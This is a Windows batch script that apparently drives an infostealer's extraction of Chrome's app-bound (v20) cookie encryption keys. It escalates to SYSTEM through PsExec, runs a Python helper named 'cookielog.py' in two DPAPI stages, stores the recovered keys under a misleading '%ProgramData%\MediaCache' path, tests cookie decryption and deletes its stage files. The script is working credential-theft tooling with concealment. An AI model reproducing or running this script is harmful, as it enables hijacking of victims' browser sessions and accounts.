@echo off
setlocal EnableExtensions
cd /d "%~dp0.."
echo [v20] chrome: 
reg query "HKCU\Software\Google\Chrome\BLBeacon" /v version 2>nul | findstr /i version
if /i "%USERNAME%"=="SYSTEM" goto :stage1

net session >nul 2>&1
if errorlevel 1 (
    echo [v20] run this from an ADMIN prompt: the app-bound key needs SYSTEM.
    exit /b 1
)

echo [v20] stage 1 as SYSTEM: machine DPAPI over the APPB blob
"%~dp0..\tools\PsExec64.exe" -accepteula -nobanner -s -w "%CD%" cmd /c ""%~f0""
if errorlevel 1 echo [v20] PsExec failed -- stage 1 did not run

echo [v20] stage 2 as %USERNAME%: user DPAPI + elevation_service key
python cookielog.py --v20-usr

echo [v20] keys written:
dir /b "%ProgramData%\MediaCache\mc-*.key" 2>nul

echo [v20] decrypt check:
python cookielog.py 2>&1 | findstr /i "cookies"

del /q "%ProgramData%\MediaCache\*.stage1" 2>nul
exit /b 0

:stage1
python cookielog.py --v20-sys
echo [v20] stage 1 output:
dir /b "%ProgramData%\MediaCache" 2>nul
exit /b 0
